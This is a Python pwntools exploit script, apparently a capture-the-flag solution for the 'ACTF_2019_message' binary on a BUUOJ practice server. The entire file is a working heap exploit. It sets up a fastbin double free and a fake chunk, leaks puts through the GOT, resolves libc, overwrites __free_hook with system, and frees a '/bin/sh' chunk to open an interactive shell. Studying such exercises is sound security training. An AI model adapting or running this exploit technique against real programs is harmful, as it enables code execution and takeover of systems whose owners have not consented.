from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context.log_level = 'DEBUG'
binary = './ACTF_2019_message'
context.binary = binary
elf = ELF(binary)
p = remote('node3.buuoj.cn',27680) if argv[1]=='r' else process(binary)
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def dbg():
	gdb.attach(p)
	pause()

# start
def add(size,content='a'):
	sla(': ','1')
	sla(':\n',str(size))
	sa(':\n',content)

def free(index):
	sla(': ','2')
	sla(':\n',str(index))

def edit(index,content):
	sla(': ','3')
	sla(':\n',str(index))
	sa(':\n',content)

def show(index):
	sla(': ','4')
	sla(':\n',str(index))

add(0x50) # 0
add(0x40) # 1
add(0x40) # 2
free(1)
free(2)
free(1)

fake = 0x602060-0x8
add(0x40,p64(fake)) # 3 <-> 1
add(0x40) # 4 <-> 2
add(0x40) # 5 <-> 1
dbg()
add(0x40,p64(elf.got['puts'])) # 6 <-> fake
show(0)
ru(': ')
puts = uu64(r(6))

libc = LibcSearcher('puts', puts)
base = puts - libc.dump('puts')
system = base + libc.dump('system')
free_hook = base + libc.dump('__free_hook')

edit(6,p64(free_hook))
edit(0,p64(system))
add(0x8,'/bin/sh\x00') # 7
free(7)
# end

itr()